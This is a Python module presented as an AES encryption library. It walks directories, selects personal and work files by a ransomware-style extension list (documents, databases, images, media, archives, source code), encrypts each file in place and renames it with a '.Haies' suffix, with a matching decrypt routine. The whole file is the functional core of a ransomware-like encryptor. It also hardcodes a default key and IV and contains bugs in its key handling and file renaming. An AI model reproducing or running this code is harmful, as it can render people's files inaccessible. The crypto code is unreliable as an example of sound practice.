#!/usr/bin/env python3
# this lib by Ahmed Haies
from Cryptodome.Cipher import AES
# from Crypto import Random
import os
import os.path


class AESCryptoLayerHaies:
	def __init__(self):
		print("init Crypto Layer By Haies")

	def __del__(self):
		print("End System By Haies")

	def Align(self, text):
		return text + (16 - len(text) % 16) * "h"

	def Encrypt(self, File, Layer=7, BlockSize=16, Key="ahmedhaies", Iv="ahmedhaies"):
		if len(Key) > 16:
			Key = Key.read(16).encode()
		elif len(Key) < 16:
			Key = self.Align(Key).encode()
		if len(Iv) > 16:
			Iv = Iv.read(16).encode()
		elif len(Iv) < 16:
			Iv = self.Align(Iv).encode()

		Crypt = AES.new(Key, AES.MODE_OFB, Iv)
		with open(File, "r+b") as f:
			text = f.read(BlockSize)
			while text:
				f.seek(-len(text), 1)
				EncLayer = Crypt.encrypt(text)
				for x in range(0, Layer):
					EncLayer = Crypt.encrypt(EncLayer)
				f.write(EncLayer)
				text = f.read(BlockSize)
		os.rename(File, File + ".Haies")
		f.close()

	def Decrypt(self, File, Layer=7, BlockSize=16, Key="ahmedhaies", Iv="ahmedhaies"):
		if len(Key) > 16:
			Key = Key.read(16).encode()
		elif len(Key) < 16:
			Key = self.Align(Key).encode()
		if len(Iv) > 16:
			Iv = Iv.read(16).encode()
		elif len(Iv) < 16:
			Iv = self.Align(Iv).encode()

		Decrypt = AES.new(Key, AES.MODE_OFB, Iv)
		with open(File, "r+b") as f:
			text = f.read(BlockSize)
			while text:
				f.seek(-len(text), 1)
				DecLayer = Decrypt.decrypt(text)
				for x in range(0, Layer):
					DecLayer = Decrypt.decrypt(DecLayer)
				f.write(DecLayer)
				text = f.read(BlockSize)
		os.rename(File, File.strip(".Haies"))
		f.close()

	def GetFileList(self, DirHaies, TypeHaies):
		Ext = []
		if TypeHaies == 1:
			Ext = [
				# 'exe', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES [danger]
				'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
				'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
				# OpenOffice, Adobe, Latex, Markdown, etc
				'yml', 'yaml', 'json', 'xml', 'csv',  # structured data
				'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images
				'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
				'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
				'java', 'class', 'jar',  # java source code
				'ps', 'bat', 'vb',  # windows based scripts
				'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
				'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files
				'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', 'tga', 'dds',  # images
				'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
				'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies
				'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak', 'apk'
			]
		elif TypeHaies == 2:
			Ext = [
				'Haies'
			]
		FilesList = []
		for dir, sd, files in os.walk(DirHaies):
			for file_name in files:
				full_path = os.path.join(dir, file_name)
				ex = full_path.split(".")[-1]
				if ex in Ext:
					FilesList.append(full_path)
		return FilesList


def DecryptOrEncrypt(DirOrFile, MethodHaies, PassWord):
	FilesList = []
	CryptLayer = AESCryptoLayerHaies()
	if int(MethodHaies) == 1:
		if os.path.isdir(DirOrFile):
			FilesList = CryptLayer.GetFileList(DirOrFile, int(MethodHaies))
		elif os.path.isfile(DirOrFile):
			FilesList.append(DirOrFile)
		else:
			return 0
		for File in FilesList:
			if os.path.exists(File):
				CryptLayer.Encrypt(File, Key=PassWord)
		return 1
	elif int(MethodHaies) == 2:
		if os.path.isdir(DirOrFile):
			FilesList = CryptLayer.GetFileList(DirOrFile, int(MethodHaies))
		elif os.path.isfile(DirOrFile):
			FilesList.append(DirOrFile)
		else:
			return 0
		for File in FilesList:
			if os.path.exists(File):
				CryptLayer.Decrypt(File, Key=PassWord)
		return 1

	return 0


